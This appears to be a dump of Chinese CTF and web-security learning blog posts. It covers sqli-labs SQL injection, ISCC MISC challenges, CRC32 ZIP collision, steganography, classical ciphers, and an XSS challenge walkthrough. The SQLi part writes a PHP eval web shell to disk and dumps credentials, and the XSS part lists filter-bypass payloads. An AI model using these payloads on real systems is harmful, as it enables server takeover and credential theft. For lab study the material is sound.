@eval($_POST[\"mi\"])?&gt;',user() into outfile \"D://6.php\"--+ 注意这里将上传文件路径改为phpstudy的根目录，其他目录菜刀连接时会没有权限。将一句话文件上传到根目录后，开始动用菜刀，右键点击添加。地址填入你上传文件的地址后面的小框中填入一句话中构造的密码1&apos;&lt;?php @eval($_POST[&quot;mi&quot;])?&gt;&apos; 如：我构造的密码为mi点击连接这多过瘾，比慢慢爆出数据库过瘾多了，这直接进入服务器了。 第二种方法-手工注入只要判断出了闭合符号，其他按照那些固定的语句来吧。一、爆列这个就不演示了，一共就三列。二、爆表1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,table_name,3 from information_schema.tables where table_schema='security' into outfile \"D://SQL//7.php\"--+ 去D盘的SQL目录中查看文件果然显示出来了三、爆字段1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 into outfile \"D://SQL//8.php\"--+ 四、爆值1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,group_concat(username,0x3a,password),3 from users into outfile \"D://SQL//9.php\"--+ 会发现这些语句都是固定不变的，变的只是一些注入方式而已，所以懂得原理很重要。 sql-labs(八)与第七关不同的就是没有了报错提醒闭合符号为：&#39; 1http://127.0.0.1/sqli-labs-master/Less-8/?id=1' union select 1,'&lt;?php @eval($_POST[\"mi\"])?&gt;',user() into outfile \"D://8.php\"--+ 利用一句话和第七关相同。手工注入的话和第七关的方法相同，这里就不演示了 接下来就要学习一种新的注入方式，时间延时盲注，具体通过第九关来看。 sql-labs(九)在第九关中，无论我们怎么判断闭合符号，其显示的只是因此我们需要换一种方式来查看到底那个是闭合符号 1http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and sleep(10)--+ 发现确实延迟了10秒，所以判断&#39;为闭合符号。再使用延时注入前，需要知道几个时间注入的函数 sleep() //延迟函数if(condition,true,false) //条件语句ascii() //转换成ascii码substr(“string”,strart,length) //取出字符串里的第几位开始，长度多少的字符 判断数据库名长度1?id=1' and if(length(database())&gt;1,sleep(4),0) --+ 爆出数据库名1?id=1'and if(ascii(substr(database(),1,1))&gt;M,sleep(5),0) --+ 原理很明显，提取数据库中的第一个字符，转化为ascll码，然后和M相比较，如果大于则睡5秒，否则不睡，这样就可以判断出第一个字符。通过改变substr函数后面的两个变量和M，我们就可以对数据库名进行猜解。 不建议手工注入，效率会很低，写一个python脚本跑一下就可以爆出来，目前自己还在学习python，等学完之后再写一个盲注的脚本，直接用别人的总感觉不太好。sql-labs(十)大致也是基于时间盲注的原理，只不过闭合符号不同罢了，就先学习到这里。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://bealright.github.io/tags/SQL注入/"}]},{"title":"ISCC2019-MISC总结","slug":"ISCC2019杂项题(MISC)总结","date":"2019-05-31T01:34:24.000Z","updated":"2019-06-07T07:53:06.097Z","comments":true,"path":"2019/05/31/ISCC2019杂项题(MISC)总结/","link":"","permalink":"http://bealright.github.io/2019/05/31/ISCC2019杂项题(MISC)总结/","excerpt":"","text":"ISCC2019刚刚结束，作为一个萌新我是真的菜，真心菜不过也会几道杂项题，就总结一下做题思路。 Aesop’s secret下载附件，打开一张gif图用PS打开,可以得到一张完整的图做到这里没思路了，就回去看题目提示。Aesop’s chest and key lie within .to find it（伊索的胸膛和钥匙都在里面。为了找到它 ）还是一脸懵，用winhex打开我们得到的完整图和gif的图看看会有什么出现。在gif图中发现下面感觉像base64，试试吧发现前面有一个单词，百度翻译（盐），一般这些都是有密钥的加密密文，取在线网站挨个解下，看看那个可以，密钥当然就是ISCC了。发现这段密文是AES加密，但结果还是base64解码，但还是解不开，那就用这个结果再来一次AES解密试试。flag用了两次AES加密，需要解两次才能得到。 Keyes’ secret下载附件，得到一开始无从下手，毫无思路，不过还好有谷歌百度，经过查询，发现应该是键盘密码。这里虽然字符多，奈何我视力好，发现了{}，按照常理，里面就应该是答案，试试吧。手动分离，还需要耐心，认真，否则很容易搞错。我就直接画了一张图，把QAZ,WSX。。。画在同一竖直方向，这样我们画的时候不至于乱。提交的格式一般是flag，这道题应该是不会在提交格式为难我们，应该就是flag{...},果然，得出flag. Welcome打开附件，繁体字，一开始以为繁体字加密？？？，但感觉不用，不可能是这样做的。毫无思路。。。用sublime打开看看。这里格式编码的问题，懒得改了。但可以发现这些空格是有规律的，有的地方是一个，有的地方是两个，这里把一个空格替换为0，两个空格替换为1。得出一段二进制 1011001100110110001100001011001110111101101001001010100110100001101000011010111110101011101000101010011000100001101001111010011010100010101111101 十六进制转换为ASCII即可得出flag转换网站 倒立屋这题LSB隐写，用神器Stegsolve打开选最低位，这里需要注意flag是倒过来的。。。 他们能在一起吗？做个题都能被。。。 唉不说了，做题吧给我们一张二维码，扫吧。扫出UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=，base64解码这里在线网站有问题，应该是PASS{0K_I_L0V3_Y0u!}这肯定不会是答案，再回去研究二维码，用winhex打开，发现后面藏着一个txt文件,提取出来。小明要凉。。。得出flag 无法执行的exe不会修复。。。用winhex打开exe文件，观察观察。这个格式不就是base64转图片那个格式？？？，试试看，在线网站不行，用一下大佬的脚本，得出一张图片常见问题了，修改png格式即可了。 扫描得出IScC_2019 隐藏的信息 10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 八进制转为十六再转位ascll即可。这里得自己写一个脚本，网上在线工具不能用。 Misc-01下载附件，打开用winhex打开，参照Jpg图片文件包括2字节：FF D8，改下即可修好。但我却在winhex里看到了很多png图binwalk一下。。。无语，扫一下吧。第一张remake:最危险的地方就是最安全的地方+1其他也类似，不过第50张不同，他加的是10086.。。。再联系一下提示果然，base64一下 1flag&#123;15cC9012&#125; Misc-02Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A，对照修改一下就可修复好一个二维码，扫一扫 中口由羊口中中大中中中井 当铺密码，解密一下1201902252228 这道题和前面那道类似，图片中还藏有东西，binwalk一下。一首让世界为你转身的歌。。。，我竟然还听出来了。那么这道题应该就是音频隐写了，利用神器MP3Stego密码即刚才破解的，破解出一个txt文件Unicode解码，即可得出flag. Score_List 下载附件，打开zip，发现有一个加密的exe文件 没什么思路，打开winhex看一下 这里还隐藏一个exe文件，binwalk分离出来 不知道用户名和密码。。。之前学长好像出过这种题，逆向的，试试吧。 发现了用户名和密码，结果也就得了出来了。 虽然做出了几道题，不过还是太菜，继续努力吧。","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"CTF关于ZIP解题思路","slug":"CTF 关于ZIP解题过程","date":"2019-05-18T10:34:24.000Z","updated":"2019-06-07T07:53:34.804Z","comments":true,"path":"2019/05/18/CTF 关于ZIP解题过程/","link":"","permalink":"http://bealright.github.io/2019/05/18/CTF 关于ZIP解题过程/","excerpt":"","text":"CTF 关于ZIP解题1.伪加密类型打开之后是两张图片，一张未加密，一张已加密。利用WinHex打开然后在谷歌上找到大佬关于zip格式的介绍接下来进行对比，看是否属于伪加密通过对比，发现确实属于伪加密。所以将09改为00即可。 总结：从50 4B 01 02 开始数十位数便能查看是否是伪加密。 2.CRC32碰撞总结![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/CTF%20zip/6.png?raw=true) 这个题是CRC32碰撞，首先有不会的就百度、谷歌。 通过查找发现需要CRC32碰撞的脚本和安装pathon。 一：安装CRC32 Tools 工具地址 二：安装pathon 因为要翻墙，去官网下载会特别慢，下载这个没有病毒，也可以用。 还有下载好之后，最好找一下这个版本的安装教程。安装3.7.2pathon的教程 配置好之后，打开cmd，进入你安装脚本的目录。打开下载好的压缩包：记录下1.2.3的CRC32值利用碰撞的语法： python crc32.py reverse “你的crc32密文”12345678910111213141516171819202122232425D:\\crc32&gt;python crc32.py reverse \"0X7F616EE3\"4 bytes: &#123;0xfc, 0xf3, 0x48, 0x10&#125;verification checksum: 0x7f616ee3 (OK)alternative: 06iBmA (OK)alternative: 2GAaYT (OK)alternative: 4BH2ir (OK)alternative: 8LCPd9 (OK)alternative: AGtKKP (OK)alternative: Dbvk8f (OK)alternative: ECiJJ3 (OK)alternative: Hp2U49 (OK)alternative: M9CXCK (OK)alternative: TrCiM1 (OK)alternative: WoYVfy (OK)alternative: _eO5jQ (OK)alternative: aHGrpU (OK)alternative: eLZsq6 (OK)alternative: k3y2Hh (OK)alternative: kCECM8 (OK)alternative: l61PcW (OK)alternative: m6paxN (OK)alternative: pymQwW (OK)alternative: xo4nzk (OK)alternative: you_ar (OK)&lt;!--破解1.flag--&gt; 12345678910111213141516171819202122D:\\crc32&gt;python crc32.py reverse \"0x127F1984\"4 bytes: &#123;0x0c, 0xa9, 0xe2, 0xfd&#125;verification checksum: 0x127f1984 (OK)alternative: 1IuEfu (OK)alternative: 7P3JWG (OK)alternative: 8_mKpP (OK)alternative: ATZP_9 (OK)alternative: K_XabT (OK)alternative: MZQ2Rr (OK)alternative: O76Mgs (OK)alternative: SxjLss (OK)alternative: TamrYX (OK)alternative: ZnrBeV (OK)alternative: bFsVOt (OK)alternative: cF2gTm (OK)alternative: e_the_ (OK)alternative: kPkXYQ (OK)alternative: lIlfsz (OK)alternative: n8DEGo (OK)alternative: oTvYX2 (OK)alternative: swYuHv (OK)&lt;!--破解2.flag--&gt; 1234567891011121314151617181920D:\\crc32&gt;python crc32.py reverse \"0x4FA83D8C\"4 bytes: &#123;0x7e, 0xfa, 0xeb, 0x0a&#125;verification checksum: 0x4fa83d8c (OK)alternative: 0KjFzu (OK)alternative: 3ka59e (OK)alternative: AwZr1l (OK)alternative: CK_lhq (OK)alternative: DRXRBZ (OK)alternative: LXN1Nr (OK)alternative: PFpQ6n (OK)alternative: RzuOos (OK)alternative: UcrqEX (OK)alternative: a5Dvga (OK)alternative: bXb8Iy (OK)alternative: cDlUSt (OK)alternative: lK2Ttc (OK)alternative: mKseoz (OK)alternative: nViZD2 (OK)alternative: ruFvTv (OK)&lt;!--破解3.flag--&gt; 接下来，找到有意义或连贯的的英语词语。通过查找发现有几个有意义的词语。12e_the_you_ar 一开始以为答案就应该是：flag{you_are_the_}，但提交还是错误。通过查找，发现漏了一种可能，就是特殊字符。CRC32和MD5加密都是不可逆的，也就是说加密之后是不能反过来看我之前的内容。所以有的大佬就将常见的词（例如 A,B,C。。。）写成了一个脚本,通过一个一个对比来破解出之前的密文。 打开我们下载的CRC32脚本。上面便是大佬脚本中的常见词，接下来我们自己添加一些特殊字符。可以看到我自己添加了；/，！等这些特殊符号。（还有一点不要在最后面加特殊字符，会有问题，最好在0前面加）。 再次破解1.2.3.flag发现3中出现有意义的词语。123456789101112131415161718192021222324252627282930313233D:\\crc32&gt;python crc32.py reverse \"0x4FA83D8C\"4 bytes: &#123;0x7e, 0xfa, 0xeb, 0x0a&#125;verification checksum: 0x4fa83d8c (OK)alternative: ,hEjj1 (OK)alternative: .83Y7h (OK)alternative: 0KjFzu (OK)alternative: 3ka59e (OK)alternative: 3w.i8q (OK)alternative: 6R,IKG (OK)alternative: ;,ZkXE (OK)alternative: ;awV5M (OK)alternative: AwZr1l (OK)alternative: CK_lhq (OK)alternative: DRXRBZ (OK)alternative: H,oAJA (OK)alternative: I,.pQX (OK)alternative: I0a,PL (OK)alternative: LXN1Nr (OK)alternative: PFpQ6n (OK)alternative: QgopD; (OK)alternative: RzuOos (OK)alternative: UcrqEX (OK)alternative: Zl,pbO (OK)alternative: a5Dvga (OK)alternative: bXb8Iy (OK)alternative: best!! (OK)alternative: cDlUSt (OK)alternative: f,CHMJ (OK)alternative: lK2Ttc (OK)alternative: mKseoz (OK)alternative: nViZD2 (OK)alternative: ruFvTv (OK)alternative: z.2t4B (OK)在这里插入代码片 best!!所以把之前的拼凑起来。1flag&#123;you_are_the_best!!&#125; 所以这样便把CRC32碰撞的题给做出了咯。 2：GIF图片修复题目已经提示这是一张GIF猜想一下flag肯定会隐藏在95KB里面（毕竟几个字母都占几KB)点击图片，但无法打开。用winhex打开。题中明明说这是一张GIF，所以应该就是修复GIF图片，查百度、谷歌大法。 地址按照上面的操作，并且将文件头改为GIF图片的格式。因为是个动态图，所以下面就得自己想办法让它显示出来。因为我下载了PS软件，所以用这个看会很方便。欧克，这道题已解开。","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"CTF隐写总结","slug":"CTF隐写总结","date":"2019-05-09T08:34:24.000Z","updated":"2019-06-07T07:53:30.305Z","comments":true,"path":"2019/05/09/CTF隐写总结/","link":"","permalink":"http://bealright.github.io/2019/05/09/CTF隐写总结/","excerpt":"","text":"CTF隐写总结一：LSB隐写 LSB概念 LSB，英文 least significant bit，中文义最低有效位。 对于一个给定的数据串,其最低有效位就是拥有最小单位数值的那一位. 关于LSB隐写的详细介绍 LSB详细介绍关于LSB隐写的详细算法 LSB详细算法关于LSB隐写的总结博客 LSB隐写总结隐写技巧：PNG文件中的LSB隐写 打开以后是一张这样的图片题目已经提醒这道题属于LSB隐写，那么就发动查百度、谷歌大法吧。经过查找，会发现需要用这个神器来处理这种题目。但打开这个软件需要有java，所以还得下载，最好也配置一下环境变量。java详细配置配置好之后那，用java打开Stegsolve.jar将图片打开后，通过下方的按钮切换不同的通道。结果你就会发现一个很不一样的东西。红色通道前六张都没有太大的变化，但是问题出现在第七张。可以明显的看到，右上方隐藏了一些东西。然后，通过观察，发现，green通道和blue通道也是如此。那接下来就进行数据提取因为发现三种颜色都是在0通道时发生了不同，所以勾选三个颜色的最低位。结果flag就出来咯！！题是很简单，但关键是要理解为何如此做，做题不难，难在理解为何这样做。大牛的博客——介绍为何勾选最低位的0这道题的解法与上一道也是一样的。 二：双图打开后是两张图片，而且两张图片一样。？？？这时就该敏感了，因为大多两张图片相同的题型都是盲水印，另外一种就是双图，但题目已经提示了是双图，所以就安装双图的做法去解决这道题。（两张图片大小不一样，第二张一定隐藏了一些信息）用Stegsolve打开第一张图再使用Image combiner( 图像结合),与第二张结合，看看会发生什么变化。（我觉得这里就是两张图片进行对比，前面可以看到第二张图片比第一张图片大了30多KB，所以那多出的30多KB的内容会出现在结合后的图片中）结果在变换通道中找到一个二维码，扫吧。。。结果什么也扫不出了。。。将这张图片保存下来，再用Stegsolve打开，变换通道，可以看到三张不同的二维码。下面就是扫码工作了，( 推荐支付宝扫码，微信我半天都没扫出来，还以为错了。。。)扫过之后，有提示，有密文，解密就能得出flag了 三：盲水印 盲水印介绍：盲水印隐蔽性强，给水印数据进行编码过后不易被破解出来，而且不会破坏图片美观，且又能很好的保护图片版权。 详细介绍盲水印的一些博客：介绍盲水印盲水印原理打开之后是两张相同的图片发动查百度、谷歌大法，破解盲水印，需要脚本或工具。 BlindWaterMark脚本但要注意这个是py2的脚本，如果下载的是py3就会出现语法错误。（这里卡了我一晚上） 修改方法是：py3自带了一个脚本2to3.py，可以将python2的程序自动转为python3的形式。但是不熟悉python语法，到后面还是会出现错误。（所以最好先不要用这个脚本去解题，待熟悉python语言后再用，否则就算知道哪里错了，也不会改）大牛的博客介绍如何修改 这里介绍另一个脚本blind-watermark这个脚本可以选择下载py3的脚本，这样就可以减少一些修改麻烦。 操作语法python decode.py –original ori.png –image res.png –result extract.png注意： 两张图片分辨率要相同，否则会报错。 在下载脚本的目录里打开cmd，输入命令。出现一个图片，但是打开却。。。黑黑的。。。啥也看不见。。。既然脚本这条路走不通，那只好偷懒了，下载工具吧。数字盲水印&amp;隐形水印制作工具WaterMarkH V1.2下载地址两张图片相同，一定是图片大的那一张隐藏有信息，所以试试第二张。flag出来了(感悟：有时如果是脚本对图片进行盲水印的话，那只能用脚本才能解开。但如果用工具添加水印的话，也只能用工具解开) 四：画图zip里面放了一张图片打开以后是一个很可爱的女孩子用Winhex打开图片，发现有很大的不同，上面全是乱码，但是到了下面全是数字，估计藏有猫腻。ctrl+A全选，然后再将这一堆数字给复制出来再用Notepad++打开提示的是画图，在坐标系里画图需要坐标，现在给的一堆数字是十六进制的数，在Notepad++中转换一下，看是否能出现坐标。结果确实出现了坐标那下面就实现画图吧，怎么画。。。我还是去找百度、谷歌吧 经过查找需要这个画图工具但是得注意一点的是，坐标必须满足这个工具的格式。必须改为这种格式的坐标改成这样很简单，只需要点击替换，把（ 和）都替换掉，把逗号改为空格就了。然后将改好的文档保存，放入gnuplot的bin目录里，打开bin目录gnuplot.exe，输入命令（我理解的是要执行的文件必须和这应用程序放在同一个目录，否则无法执行，会报错). 输入命令 plot “文件名” 用支付宝一扫就🆗了","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"CTF密码学总结","slug":"CTF Crypto(密码学)总结","date":"2019-05-08T12:34:24.000Z","updated":"2019-06-07T07:53:39.720Z","comments":true,"path":"2019/05/08/CTF Crypto(密码学)总结/","link":"","permalink":"http://bealright.github.io/2019/05/08/CTF Crypto(密码学)总结/","excerpt":"","text":"最近接触了一些密码学的题，感觉特别有意思，写下博客来记录一下，以免忘记 一：哈夫曼树.png?raw=true)哈夫曼树（也称为最优二叉树），虽然（目前）没学，但是百度、谷歌大法无敌。查查原理，再去做题。经过一番查找，懂了原理，就总结了一下简单说：叶子结点：权值a : 4d ：9g : 1f : 5l : 10 : 75 : 9{ : 1} : 1 画图时最上面的是根，而最优二叉树的规则则是需要权值大的尽量放在上面例如：叶子结点：权值a 7b 5c 2d 4搞懂了这个，但是这个题中还给了我们一堆数111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 这些代表上面意思那？？经过查找发现发现原来这是哈夫曼树编码详细的介绍 那我们先来完成第一步，画树。一开始没画对，画了三四遍，才算画出来，不过不太熟练，还得练。画的时候最好从下到上画，先把权值小的画出来，一步一步往上画。 既然画出来了，那就用哈夫曼树编码来把每个数字或字符用编码的方式表示出来。通过画也发现在同一分支中，哪个权值大，那么哪个就是1。例如:17下的d（权值为9）和权值为8的相比，那么d的路径就表示为1. 接下来就是安装这样的方法把那么字符都用编码表示出来 f:110 l:00111 a:000 g:00101 ..... 下面都这样表示接下来就开始进行比对111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 一般CTF题的提交格式都是flag{……}所以我们这里就首先看第一个是不是f110 恰好对应 f00111 恰好对应 l000 恰好对应 a00101 恰好对应 g前面对应了几乎就没啥子问题了，但是还有一点比较坑的有的因为权值相等，需要在转换的时候看是否应该换一下位置。例如：{ 和 } 权值相等，在转化时看是否需要进行换位置。 我们再观察我们上面画的图，其中5和d的权值也相同，所以如果提交的答案不对的话，就尝试一下换下位置。这道题是西湖论剑的题，下面有进入决赛大佬的WP。关于西湖题的wp 二：传统知识+古典密码在实验吧上做了一道很有意思的题目。首先就想了解一下传统知识吧在百度上找到六十甲子顺序表，就先对应着把数字写出来。 辛卯28，癸巳30，丙戌23，辛未8，庚辰17，癸酉10，己卯16，癸巳30。“+甲子60”（这里有一个疑问，按图来说甲子不应该是1吗？？？ 为什么会+60。。。其实这里面还是对传统文化的不熟悉，查查百度，如果还晕的话，记住就行了）处理完之后的数88,90,83,68,77,70,76,90转换一下ASCII码看看XZSDMFLZ没思路了。。。看看题目咋提示的古典密码古典密码一般涉及的就是替换或移位就先用栅栏密码试试了一共8位： 可以分为2个字一组，也可以是4个字一组，都试试。先用2个字为一组的，解出来栅栏密码在线解密XMZFSLDZ再用凯撒密码解密凯撒在线解密发现有一串字母好像是有点意义的，拿出来试试。shuangyu改为大写，因为我们输入的就是大写。SHUANGYUCTF{SHUANGYU}提交结果正确，就不用再往下试了。这个题有很多好玩的地方，需要了解传统的甲子表，需要了解栅栏密码，要了解凯撒密码。wiki大佬关于密码学的WP各种加密方式 三、滴答滴答下载起来，打开后是这样的看过柯南的都应该知道这个是摩斯密码，所以拿去解一下密，看看会出现什么？摩斯密码解密后面的一堆C和D，但是前面我看到了MORSE（摩斯）后面的应该有意义，百度翻译看一下吧培根？？？，查一下。了解培根加密之后，我们就知道那一堆C和D有啥用处了首先，我们先把C转化为A，D转化为B。转化完成后，进行解密培根加密解密结果出来了，百度翻译一下。当时在这里卡了，猛的一下不知道啥意思。。。还是太菜。经过学长提醒。。。是栅栏密码，猛的一下明白了，原来ZGIAHYANAUOZNXWI这个就是密文，而且也提示了四道栅栏，所以每组四个字。章鱼小丸子至于提交就有点坑了，不用flag{}格式，直接提交就行。不过这道题确实很有意思，了解了摩斯密码，培根密码，栅栏密码。不过还得练，还是太菜，有的时候就是想不到。。。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"XSS学习-XSS挑战之旅(一)","slug":"web安全—XSS攻击(二)","date":"2019-04-28T12:20:32.000Z","updated":"2019-07-24T00:42:02.501Z","comments":true,"path":"2019/04/28/web安全—XSS攻击(二)/","link":"","permalink":"http://bealright.github.io/2019/04/28/web安全—XSS攻击(二)/","excerpt":"","text":"练习了DVWA靶场中的XSS了解了一些原理和攻击方式，接下来就用在线XSS平台开始实战一番。 在线XSS平台地址 第一关用最常用的攻击语句试试。 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 第二关就先把这个最简单的攻击语句放上去看看 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 没有出现弹窗，看下页面源代码。12&lt;input name=keyword value=\"&lt;script&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=\"搜索\"/&gt; 观察代码，要想我们的语句起作用，就需要把前面的&lt;input&gt;标签给闭合掉。那就输入这样的语句：payload：1\"&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt; 第三关还是那个套路，放上最常用的语句试试没有成功，看看页面源代码 12&lt;input name=keyword value='&amp;lt;script&amp;gt;alert(/hacker/)&amp;lt;/script&amp;gt;'&gt;&lt;input type=submit name=submit value=搜索 /&gt; 发现输入的&lt;和&gt;被转义了既然过滤了&lt;和&gt;，那就换一种攻击方式，用onclick 事件，onclick 事件会在元素被点击时发生。onclick 事件直接包含在&lt;&gt;内，并且可以被执行。再观察页面源代码，是单引号，那就在前面加&#39;把value给闭合掉。payload：1'onclick='javascript:alert(/hacker/)' 输入之后，再点击一下输入框 第四关先拿一个攻击语句测试下，再看看页面源代码。 12&lt;input name=keyword value=\"scriptalert(/hacker/)/script\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 观察到&lt;和&gt;直接被过滤掉了那就用onclick 事件，这里是双引号，那就在前面输入&quot;，把value给闭合掉。payload：1\"onclick=\"javascript:alert(/hacker/)\" 第五关还是那个套路，先输入常用的看看,没有弹窗，看看页面源代码。 12&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(/xss/)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 发现on中多了一个下划线，所以过滤了onclick事件，试试script,再看页面源代码。12&lt;input name=keyword value=\"\"&gt;&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 果然，script也同样被过滤了。那就用&lt;a&gt;标签构造攻击语句试试。payload：1\"&gt;&lt;a href=\"javascript:alert(/xss/)\"&gt;hacker&lt;/a&gt; 也可以再后面加上//注释掉后面的&quot;/，以免对前面的语句产生影响。 第六关输入我们刚才用的语句，看页面源代码。 12&lt;input name=keyword value=\"&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 12&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(/xss/)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 12&lt;input name=keyword value=\"\"&gt;&lt;a hr_ef=\"javascript:alert(/xss/)\"&gt;点这里&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 可以看到在这里，href和script、onclick事件都被过滤了。这里过滤的是onclick,改为大写试试。payload：1\"ONCLICK=\"javascript:alert(/hacker/)\" 在浏览博客的时候也看到一个大佬用的payload1\"&gt;&lt;svg x=\"\" Onclick=alert(1)&gt; 利用&lt;svg&gt;标签进行攻击。 第七关输入&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;查看页面源代码12&lt;input name=keyword value=\"\"&gt;&lt;a =\"java:alert(/xss/)\"&gt;点这里&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 输入&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;查看页面源代码12&lt;input name=keyword value=\"\"&gt;&lt;&gt;alert(/hacker/)&lt;/&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 这次更狠，直接把关键字给过滤没了用双写绕过payload：1\"&gt;&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt; 过滤掉中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。 第八关输入&quot;onclick=&quot;javascript:alert(/hacker/)&quot;发现href,script被过滤，就试试onclick事件。页面源代码： 12&lt;input name=keyword value=\"&amp;quot;onclick=&amp;quot;javascript:alert(/hacker/)&amp;quot;\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt; 发现&quot;,&lt;,&gt;也被转义了。再次观察源代码，发现友情链接。。。真的是提示，这不就是&lt;a&gt;标签绕过吗?1234&lt;input name=keyword value=\"javascript:alert(1)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"javascr_ipt:alert(1)\"&gt;友情链接&lt;/a&gt; 既然下面有&lt;a&gt;标签，那我们就直接输入这个语句1javascript:alert(/hacker/) 但是script会被过滤，换一种方式表达script采用HTML字符实体转换地址方法一：payload：1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/) 参考大佬的payload:方法二：用 html 的自解码机制就可以绕过1javasc&amp;#114;ipt:alert(0) 方法三：可以全转换为HTML实体1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; 第九关又是友情链接，把刚才的语句输入进去，查看页面源代码。 1234&lt;input name=keyword value=\"java&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:alert(/hacker/)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt; 我们输入的语句并没有进入到 &lt;a&gt;标签中，这里应该对格式有一定要求，查看大佬的博客后发现需要添加http://,否则不合法。payload：1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)//http:// 第九关和第八关类似，区别就是第九关添加了url验证合法性。 第十关这次更狠，连个输入框都不给。那就先看一下页面源代码吧 12345&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; 一脸懵，不知道该如何下手了,只能去查看大佬的wp了。先测试测试哪个可以注入查看页面源代码，发现123&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\"text\"\" type=\"hidden\"&gt; 找到了，t_sort就是注入点，那就开始注入吧代码中有隐藏的参数设置,把hidden改为textpayload：1&amp;t_sort=\"onclick=\"alert(/hacker/)\"type=\"text\" 也可以1&amp;t_sort=\" type=\"text\" onclick=\"alert(/hacker/) 第十一关还没有输入框，那类型应该和第十关比较类似，先看页面源代码。 123456&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"http://test.xss.tv/level10.php?keyword=well%20done!&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(1)\" type=\"hidden\"&gt;&lt;/form&gt; 一样的方法，先测试一下看那个可以注入查看页面源代码123456&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"3\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; 发现了t_sort是可以注入的，把刚才的payload拿来试试1&lt;input name=\"t_sort\" value=\"&amp;quot;onclick=&amp;quot;alert(/hacker/)&amp;quot;type=&amp;quot;text&amp;quot;\" type=\"hidden\"&gt; 发现&quot;被转义了，把&quot;转化为HTML实体也不行。查大佬的wp吧发现做到这一关需要burpsuite抓包工具来帮忙,所以先做到这里,等到会用抓包工具了，再回过头来继续做。 